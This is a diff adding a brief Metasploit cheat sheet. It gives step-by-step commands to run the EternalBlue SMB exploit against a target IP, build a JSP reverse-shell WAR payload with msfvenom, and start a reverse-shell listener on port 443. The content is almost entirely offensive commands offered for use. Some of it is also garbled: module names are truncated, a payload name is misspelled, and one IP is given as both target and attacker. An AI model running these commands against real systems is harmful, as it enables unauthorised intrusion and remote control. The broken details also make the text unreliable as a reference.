@@ -1,0 +1,29 @@
+Metasploit Framework
+
+Start Metasploit, search & use exploit:
+
+# msfconsole
+
+msf > search eternalblue
+
+msf > use exploit/windows/smb/ms17_..
+msf exploit(..) > show options
+
+msf exploit(..) > set TARGET 100.76.2.3
+msf exploit(..) > exploit
+
+Generate reverse shell (WAR):
+
+$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip address> LPORT=443 -f war > sh.war
+
+Reverse shell listener:
+
+msf > use exploit/multi/handler
+
+msf > set payload lLinux/x64/shell_reverse_tcp
+msf > set LHOST 100.76.2.3 # attacker
+
+msf > set LPORT 443
+
+msf > exploit
+
